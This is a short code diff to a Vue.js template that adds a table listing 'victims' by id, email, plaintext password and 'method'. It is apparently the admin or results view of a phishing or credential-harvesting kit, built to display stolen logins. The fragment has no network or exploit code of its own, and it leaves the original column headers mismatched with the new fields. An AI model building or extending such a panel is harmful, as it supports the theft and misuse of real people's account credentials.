@@ -190,5 +190,24 @@
 
     <h1>{{ message }}</h1>
 
+    <table class="table">
+      <thead>
+        <tr>
+          <th scope="col">#</th>
+          <th scope="col">First</th>
+          <th scope="col">Last</th>
+          <th scope="col">Handle</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr v-for="victim in victims">
+          <th scope="row">{{ victim.id }}</th>
+          <td>{{ victim.email }}</td>
+          <td>{{ victim.password }}</td>
+          <td>{{ victim.method }}</td>
+        </tr>
+      </tbody>
+    </table>
+
   </div>
 </template>
